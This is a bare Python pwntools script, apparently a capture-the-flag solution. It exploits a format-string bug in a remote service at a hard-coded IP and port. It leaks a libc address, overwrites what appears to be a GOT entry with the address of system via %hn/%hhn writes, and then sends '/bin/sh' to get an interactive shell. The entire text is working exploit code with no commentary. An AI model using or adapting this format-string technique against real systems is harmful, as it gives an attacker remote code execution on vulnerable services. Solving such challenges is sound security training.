from pwn import*
from LibcSearcher import*
libc = ELF('./libc-2.23.so',checksec=False)
context.log_level ='DEBUG'
p = remote('111.198.29.45',36807)
payload = '%2434c%11$hnLIBC:%43$p'
payload = payload.ljust(0x18,'U')
payload += p64(0x601060)
p.sendlineafter('enter:','2')
p.sendafter('slogan: ',payload)
p.recvuntil('LIBC:')
libc.address = int(p.recv(14),16) - 0xF0 - libc.sym['__libc_start_main']
I =  (libc.sym['system']&0xFF)
II = ((libc.sym['system']&0xFFFFFF)>>8) - I
payload = '%' + str(I) + 'c%13$hhn' + '%' + str(II) + 'c%14$hn'
payload = payload.ljust(0x20,'U')
payload += p64(0x601030) + p64(0x601031)
p.recvuntil('slogan: ')
p.sendline(payload)
p.sendlineafter('slogan: ','/bin/sh\x00')
p.interactive()
